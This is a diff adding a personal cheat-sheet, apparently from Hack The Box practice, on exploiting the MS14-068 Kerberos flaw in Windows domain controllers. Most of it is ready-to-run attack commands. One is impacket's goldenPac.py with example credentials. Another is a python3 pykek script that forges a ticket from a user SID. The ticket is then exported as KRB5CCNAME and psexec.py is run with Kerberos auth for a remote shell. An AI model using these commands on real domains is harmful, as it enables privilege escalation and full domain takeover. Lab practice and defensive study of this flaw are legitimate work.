@@ -1,0 +1,30 @@
+
+# MS 14-068
+
+Required: domain user credentials, connection to DC, kerberos port open (is a kerberos vuln)
+Vulnerable: Windows server 2008 R2 or older...
+
+from impacket suite:
+
+  goldenPac.py htb.local/james:password@mantis
+               <domain>  <user>  <pwd>  <domain*>
+
+IMPORTAN NOTE 1: Exploit it first time and look what domain targets (Example mantis.htb.local)
+then put this domain at /etc/hosts
+
+IMPORTAN NOTE 2: In the domain*, after the "@" simbol put only text, not numbers.
+And also put this text in /etc/hosts to make sure it finds the IP.
+
+source: https://tools.thehacker.recipes/impacket/examples/goldenpac.py
+
+-------------------------------------------------------------------------
+
+Aditionally, use my adaptation to python3 from pykek.
+
+extract user sid from ldap or rpc
+
+python3 ms14-068.py -u '<user>'@'<domain>' -p '<password>' -s "<user sid>" -d "<dc ip>"
+
+export ccache file -> export KRB5CCNAME=TGT_ticket...ccache
+
+psexec.py '<domain>/<user>:@<machine.domain>' -no-pass -k
